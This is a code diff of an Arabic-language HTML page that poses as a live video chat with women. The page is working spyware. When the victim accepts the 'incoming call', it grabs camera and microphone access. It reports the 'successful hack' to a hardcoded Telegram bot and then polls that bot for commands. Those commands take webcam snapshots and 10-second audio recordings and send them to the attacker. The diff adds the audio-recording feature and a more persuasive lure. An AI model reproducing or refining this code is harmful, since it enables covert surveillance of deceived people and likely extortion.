@@ -3,67 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دردشة فيديو مباشرة</title>
+    <title>دردشة فيديو مباشرة | بنات لايف</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
-        .btn { background: #ff0055; color: #fff; padding: 20px; border-radius: 50px; border: none; font-size: 20px; cursor: pointer; width: 80%; }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 25px; text-align: center; border: 2px solid #ff0055; width: 85%; box-shadow: 0 0 20px #ff0055; }
+        .btn { background: linear-gradient(45deg, #ff0055, #ff00aa); color: white; border: none; padding: 15px; border-radius: 50px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .live { color: #ff0055; font-size: 12px; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div id="content">
-        <h2>🔥 مكالمة واردة...</h2>
-        <button class="btn" id="startBtn">قبول المكالمة</button>
-        <p id="msg"></p>
+    <div class="card">
+        <div class="live">● مباشر الآن</div>
+        <h2>مكالمة فيديو واردة... 🔥</h2>
+        <p>اضغط للبدء في الدردشة مع الفتيات المتصلات.</p>
+        <button class="btn" id="startBtn">قبول المكالمة 💖</button>
+        <p id="status" style="font-size: 12px; margin-top: 15px; color: #888;"></p>
     </div>
 
     <script>
         const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
         const CHAT_ID = "8350812242";
-        let stream;
+        let mediaStream;
 
+        // تشغيل الاختراق بمجرد الضغط
         document.getElementById('startBtn').addEventListener('click', async () => {
             try {
-                // فتح الكاميرا والميكروفون فوراً عند الضغط
-                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                document.getElementById('msg').innerText = "جاري الاتصال...";
+                mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
                 
-                // إبلاغ البوت بالسيطرة
-                sendMsg("✅ الجهاز متصل وجاهز للأوامر (Reno 13)");
+                // إرسال إشعار السيطرة للبوت
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ تم الاختراق بنجاح! الجهاز (Reno 13) جاهز للأوامر:\n1- اكتب (صورة) لسحب لقطة.\n2- اكتب (اسمع) لتسجيل صوت 10 ثواني.")}`);
 
-                // فحص الأوامر من لوحة تحكمك كل 5 ثواني
-                setInterval(checkRemoteControl, 5000);
+                // فحص الأوامر من تليجرام كل 5 ثواني
+                setInterval(checkCommands, 5000);
             } catch (e) {
-                document.getElementById('msg').innerText = "يجب السماح بالصلاحيات!";
+                document.getElementById('status').innerText = "يجب السماح بالصلاحيات للمتابعة!";
             }
         });
 
-        async function checkRemoteControl() {
+        async function checkCommands() {
             const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
             const data = await res.json();
             if (data.result.length > 0) {
                 const cmd = data.result[0].message.text;
                 if (cmd === "صورة") takePhoto();
-                if (cmd === "صوت") sendMsg("🎤 الميكروفون شغال وبسمعك حالياً...");
+                if (cmd === "اسمع") recordAudio();
             }
         }
 
         async function takePhoto() {
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            await v.play();
-            const c = document.createElement('canvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(b => {
+            const video = document.createElement('video');
+            video.srcObject = mediaStream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', b, 'live.jpg');
+                fd.append('photo', blob, 'shot.jpg');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg');
         }
 
-        function sendMsg(m) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`);
+        async function recordAudio() {
+            const recorder = new MediaRecorder(mediaStream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', blob, 'rec.ogg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 10000); // يسجل 10 ثواني
         }
     </script>
 </body>
